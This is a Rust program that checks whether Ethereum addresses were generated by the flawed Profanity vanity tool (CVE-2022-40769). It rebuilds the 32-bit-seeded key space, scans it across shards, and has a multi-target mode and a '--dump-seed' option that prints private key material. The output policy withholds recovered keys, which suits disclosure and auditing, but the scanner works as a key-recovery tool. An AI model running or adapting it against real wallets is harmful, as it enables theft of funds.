//! Provable check for CVE-2022-40769 (the Profanity vanity-address flaw).
//!
//! From the original source (`Dispatcher.cpp`, `createSeed()`):
//!
//! ```c
//! std::random_device rd;
//! std::mt19937_64 eng(rd());                 // seeded with only 32 bits
//! r.s[0] = distr(eng); r.s[1] = distr(eng);  // 256-bit seed, used directly as
//! r.s[2] = distr(eng); r.s[3] = distr(eng);  // the private key
//! ```
//!
//! The kernel takes `G^k` for that key and walks forward one increment per round,
//! so the reachable key space is exactly:
//!
//!     key(x, i) = mt19937_64(x) as a 256-bit scalar + i
//!     x in [0, 2^32)   (the 32-bit seed)
//!     i in [0, depth]  (rounds the generator ran before finding its pattern)
//!
//! Verification is exact, not heuristic:
//!   1. Walk DOWN from the candidate's public key: P_j = P - j*G, j <= depth.
//!      If Profanity made the key, one of those points is a seed public key.
//!   2. Scan this shard's seeds; for each x compute address(mt19937_64(x)).
//!   3. A match means the candidate's private key is seed(x) + j: recoverable,
//!      therefore drainable by anyone.
//!
//! A match is proof. No match over the full seed range is a proof of the
//! opposite, up to the depth chosen.
//!
//! Output policy: seed and key are never printed or stored. Only the boolean,
//! the candidate address and the shard are emitted, so the result can be
//! published and re-derived by anyone running the same code.
//!
//! Validated against libstdc++'s `std::mt19937_64` limb for limb (see README).

use std::collections::HashSet;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Instant;

use secp256k1::{All, PublicKey, Secp256k1, SecretKey};
use sha3::{Digest, Keccak256};

/// MT19937-64, the generator `std::mt19937_64` uses (Matsumoto & Nishimura 2000;
/// seeding per `init_genrand64`). Verified to match libstdc++ exactly.
struct Mt19937_64 {
    mt: [u64; 312],
    idx: usize,
}

impl Mt19937_64 {
    fn new(seed: u64) -> Self {
        let mut mt = [0u64; 312];
        mt[0] = seed;
        for i in 1..312 {
            mt[i] = 6364136223846793005u64
                .wrapping_mul(mt[i - 1] ^ (mt[i - 1] >> 62))
                .wrapping_add(i as u64);
        }
        Mt19937_64 { mt, idx: 312 }
    }

    fn twist(&mut self) {
        for i in 0..312 {
            let x = (self.mt[i] & 0xffffffff80000000) | (self.mt[(i + 1) % 312] & 0x7fffffff);
            let mut x_a = x >> 1;
            if x & 1 == 1 {
                x_a ^= 0xb5026f5aa96619e9;
            }
            self.mt[i] = self.mt[(i + 156) % 312] ^ x_a;
        }
        self.idx = 0;
    }

    fn next_u64(&mut self) -> u64 {
        if self.idx >= 312 {
            self.twist();
        }
        let mut y = self.mt[self.idx];
        self.idx += 1;
        y ^= (y >> 29) & 0x5555555555555555;
        y ^= (y << 17) & 0x71d67fffeda60000;
        y ^= (y << 37) & 0xfff7eee000000000;
        y ^= y >> 43;
        y
    }
}

/// The 256-bit private key Profanity would have used for 32-bit seed `x`: four
/// raw draws, `s[0]` least significant. libstdc++'s `uniform_int_distribution<u64>`
/// over the full range returns the raw draw.
fn profanity_key_bytes(x: u32) -> [u8; 32] {
    let mut mt = Mt19937_64::new(x as u64);
    let limbs = [mt.next_u64(), mt.next_u64(), mt.next_u64(), mt.next_u64()];
    let mut bytes = [0u8; 32];
    for (i, limb) in limbs.iter().enumerate() {
        bytes[i * 8..i * 8 + 8].copy_from_slice(&limb.to_le_bytes());
    }
    bytes
}

fn address_of(pk: &PublicKey) -> [u8; 20] {
    let serialized = pk.serialize_uncompressed();
    let hash = Keccak256::digest(&serialized[1..]); // drop the 0x04 prefix
    let mut out = [0u8; 20];
    out.copy_from_slice(&hash[12..]);
    out
}

fn parse_pubkey(_secp: &Secp256k1<All>, hex_str: &str) -> Option<PublicKey> {
    let raw = hex::decode(hex_str.trim_start_matches("0x")).ok()?;
    let mut bytes = Vec::with_capacity(65);
    if raw.len() == 64 {
        bytes.push(0x04);
    }
    bytes.extend_from_slice(&raw);
    PublicKey::from_slice(&bytes).ok()
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let mut address: Option<String> = None;
    let mut pubkey: Option<String> = None;
    let mut shard_index: u64 = 0;
    let mut shard_count: u64 = 1;
    let mut depth: u64 = 1 << 24;
    let mut targets: Option<String> = None;
    let mut selftest = false;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--address" => {
                address = Some(args[i + 1].clone());
                i += 2;
            }
            "--pubkey" => {
                pubkey = Some(args[i + 1].clone());
                i += 2;
            }
            "--shard" => {
                let parts: Vec<u64> = args[i + 1]
                    .split('/')
                    .filter_map(|p| p.parse().ok())
                    .collect();
                shard_index = parts.first().copied().unwrap_or(0);
                shard_count = parts.get(1).copied().unwrap_or(1);
                i += 2;
            }
            "--depth" => {
                depth = args[i + 1].parse().unwrap_or(depth);
                i += 2;
            }
            "--targets" => {
                targets = Some(args[i + 1].clone());
                i += 2;
            }
            "--selftest" => {
                selftest = true;
                i += 1;
            }
            "--dump-seed" => {
                let x: u32 = args[i + 1].parse().expect("seed");
                let bytes = profanity_key_bytes(x);
                let secp = Secp256k1::new();
                let sk = SecretKey::from_slice(&bytes).expect("valid scalar");
                let pk = PublicKey::from_secret_key(&secp, &sk);
                println!(
                    "seed {}: key limbs {} {} {} {} | address 0x{}",
                    x,
                    hex::encode(&bytes[0..8]),
                    hex::encode(&bytes[8..16]),
                    hex::encode(&bytes[16..24]),
                    hex::encode(&bytes[24..32]),
                    hex::encode(address_of(&pk))
                );
                return;
            }
            _ => i += 1,
        }
    }

    if selftest {
        run_selftest();
        return;
    }

    // Multi-target mode: check every seed's address against a whole set of
    // addresses at once. This is the cheap, high-throughput pass: one 64-shard
    // run tests thousands of candidates at chain position 0 simultaneously.
    if let Some(path) = targets {
        let list: Vec<String> = serde_json::from_str(&std::fs::read_to_string(&path).expect("read targets"))
            .expect("targets file must be a JSON array of addresses");
        let set: HashSet<[u8; 20]> = list
            .iter()
            .filter_map(|a| {
                let raw = hex::decode(a.trim_start_matches("0x")).ok()?;
                if raw.len() != 20 {
                    return None;
                }
                let mut b = [0u8; 20];
                b.copy_from_slice(&raw);
                Some(b)
            })
            .collect();
        let total: u64 = 1u64 << 32;
        let per_shard = total / shard_count;
        let start = shard_index * per_shard;
        let end = if shard_index == shard_count - 1 { total } else { start + per_shard };
        let threads = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1);
        eprintln!("  multi-target: {} addresses, seeds [{}, {}) on {} threads", set.len(), start, end, threads);
        let secp = Secp256k1::new();
        let counter = AtomicU64::new(start);
        let checked = AtomicU64::new(0);
        let hits = std::sync::Mutex::new(Vec::<String>::new());
        let started = Instant::now();
        std::thread::scope(|scope| {
            for _ in 0..threads {
                scope.spawn(|| loop {
                    let x = counter.fetch_add(1, Ordering::Relaxed);
                    if x >= end {
                        break;
                    }
                    let bytes = profanity_key_bytes(x as u32);
                    let Ok(sk) = SecretKey::from_slice(&bytes) else { continue };
                    let pk = PublicKey::from_secret_key(&secp, &sk);
                    let addr = address_of(&pk);
                    if set.contains(&addr) {
                        hits.lock().unwrap().push(format!("0x{}", hex::encode(addr)));
                        eprintln!("  MATCH: seed in this shard produces target 0x{}", hex::encode(addr));
                    }
                    let n = checked.fetch_add(1, Ordering::Relaxed) + 1;
                    if n % (1 << 24) == 0 {
                        let secs = started.elapsed().as_secs_f64();
                        eprintln!("  progress: {} seeds ({:.0}/s)", n, n as f64 / secs.max(0.001));
                    }
                });
            }
        });
        let hits = hits.into_inner().unwrap();
        println!(
            "{{\"targets\":{},\"shard\":\"{}/{}\",\"seeds_checked\":{},\"seconds\":{:.1},\"matches\":{}}}",
            set.len(), shard_index, shard_count,
            checked.load(Ordering::Relaxed), started.elapsed().as_secs_f64(),
            serde_json::to_string(&hits).unwrap()
        );
        return;
    }

    let address = address.expect("--address is required");
    let expected: [u8; 20] = {
        let raw = hex::decode(address.trim_start_matches("0x")).expect("address must be hex");
        assert_eq!(raw.len(), 20, "address must be 20 bytes");
        let mut a = [0u8; 20];
        a.copy_from_slice(&raw);
        a
    };

    let secp = Secp256k1::new();

    // 1. Walk down from the candidate public key, collecting the addresses a seed
    //    public key would have if the candidate sits at chain position j.
    let mut down_addresses: HashSet<[u8; 20]> = HashSet::with_capacity((depth as usize).min(1 << 26) + 1);
    if let Some(pk) = pubkey.as_deref().and_then(|p| parse_pubkey(&secp, p)) {
        let neg_g = PublicKey::from_secret_key(
            &secp,
            &SecretKey::from_slice(&{
                let mut b = [0u8; 32];
                // n - 1 is the negation of the generator's secret key.
                b[0..32].copy_from_slice(&hex::decode("fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140").unwrap());
                b
            })
            .expect("neg generator"),
        );
        let mut point = pk;
        for j in 0..=depth {
            down_addresses.insert(address_of(&point));
            point = PublicKey::combine(&point, &neg_g).expect("point subtraction");
            if j > 0 && j % (1 << 22) == 0 {
                eprintln!("  walk-down: {} of {} addresses", j, depth);
            }
        }
        eprintln!(
            "  walk-down complete: {} addresses from the candidate pubkey",
            down_addresses.len()
        );
    } else {
        down_addresses.insert(expected);
        eprintln!("  no pubkey given: only chain position 0 can be tested");
    }

    // 2. Scan this shard of the 32-bit seed space.
    let total: u64 = 1u64 << 32;
    let per_shard = total / shard_count;
    let start = shard_index * per_shard;
    let end = if shard_index == shard_count - 1 {
        total
    } else {
        start + per_shard
    };
    let threads = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1);
    eprintln!(
        "  scanning seeds [{}, {}) = {} seeds on {} threads",
        start,
        end,
        end - start,
        threads
    );

    let counter = AtomicU64::new(start);
    let checked = AtomicU64::new(0);
    let matched = AtomicU64::new(0);
    let started = Instant::now();

    std::thread::scope(|scope| {
        for _ in 0..threads {
            scope.spawn(|| loop {
                let x = counter.fetch_add(1, Ordering::Relaxed);
                if x >= end {
                    break;
                }
                let bytes = profanity_key_bytes(x as u32);
                let Ok(sk) = SecretKey::from_slice(&bytes) else {
                    continue;
                };
                let pk = PublicKey::from_secret_key(&secp, &sk);
                if down_addresses.contains(&address_of(&pk)) {
                    matched.fetch_add(1, Ordering::Relaxed);
                    // Only the fact is reported; the seed is key material.
                    eprintln!("  MATCH: a seed in this shard produces the candidate address");
                }
                let n = checked.fetch_add(1, Ordering::Relaxed) + 1;
                if n % (1 << 24) == 0 {
                    let secs = started.elapsed().as_secs_f64();
                    eprintln!(
                        "  progress: {} seeds ({:.0}/s, {:.1} min)",
                        n,
                        n as f64 / secs.max(0.001),
                        secs / 60.0
                    );
                }
            });
        }
    });

    let secs = started.elapsed().as_secs_f64();
    let hits = matched.load(Ordering::Relaxed);
    println!(
        "{{\"address\":\"{}\",\"shard\":\"{}/{}\",\"depth\":{},\"seeds_checked\":{},\"seconds\":{:.1},\"match\":{}}}",
        address,
        shard_index,
        shard_count,
        depth,
        checked.load(Ordering::Relaxed),
        secs,
        hits > 0
    );
    if hits > 0 {
        eprintln!(
            "  VULNERABLE: the candidate's private key lies in the Profanity seed space \
             (key withheld; reproducible by re-running this shard)"
        );
    }
}

/// Proves the pipeline end to end: derive keys the buggy generator would have
/// produced, then find them again by scanning the seed space.
fn run_selftest() {
    let secp = Secp256k1::new();
    for x in [0u32, 1, 12345, 4_294_967_295] {
        let bytes = profanity_key_bytes(x);
        let sk = SecretKey::from_slice(&bytes).expect("valid scalar");
        let pk = PublicKey::from_secret_key(&secp, &sk);
        let addr = address_of(&pk);

        // Walk the chain forward and require the walk-down to recover the seed point.
        let mut chain = pk;
        for _ in 0..3 {
            chain = PublicKey::combine(&chain, &PublicKey::from_secret_key(&secp, &SecretKey::from_slice(&{
                let mut b = [0u8; 32];
                b[31] = 1;
                b
            }).unwrap())).unwrap();
        }
        let mut back = chain;
        let neg_g = PublicKey::from_secret_key(&secp, &SecretKey::from_slice(&hex::decode(
            "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140",
        ).unwrap()).unwrap());
        let mut recovered = false;
        for _ in 0..4 {
            if address_of(&back) == addr {
                recovered = true;
                break;
            }
            back = PublicKey::combine(&back, &neg_g).unwrap();
        }
        assert!(recovered, "walk-down failed to recover the seed point");
        println!(
            "selftest seed {}: address 0x{} | walk-down recovers seed point: {}",
            x,
            hex::encode(addr),
            recovered
        );
    }

    // End-to-end: a target five steps along seed 12345's chain must be found by
    // scanning a tiny seed window.
    let x = 12345u32;
    let mut chain = PublicKey::from_secret_key(
        &secp,
        &SecretKey::from_slice(&profanity_key_bytes(x)).unwrap(),
    );
    let one = PublicKey::from_secret_key(&secp, &SecretKey::from_slice(&{
        let mut b = [0u8; 32];
        b[31] = 1;
        b
    }).unwrap());
    for _ in 0..5 {
        chain = PublicKey::combine(&chain, &one).unwrap();
    }
    let neg_g = PublicKey::from_secret_key(&secp, &SecretKey::from_slice(&hex::decode(
        "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140",
    ).unwrap()).unwrap());
    let mut down: HashSet<[u8; 20]> = HashSet::new();
    let mut p = chain;
    for _ in 0..=8 {
        down.insert(address_of(&p));
        p = PublicKey::combine(&p, &neg_g).unwrap();
    }
    let mut hit: Option<u32> = None;
    for s in 12340..12350u32 {
        if let Ok(sk) = SecretKey::from_slice(&profanity_key_bytes(s)) {
            let pk = PublicKey::from_secret_key(&secp, &sk);
            if down.contains(&address_of(&pk)) {
                hit = Some(s);
            }
        }
    }
    assert_eq!(hit, Some(x), "end-to-end scan failed to find the known seed");
    println!("selftest OK: derivation, address, chain, walk-down and seed scan all consistent");
}
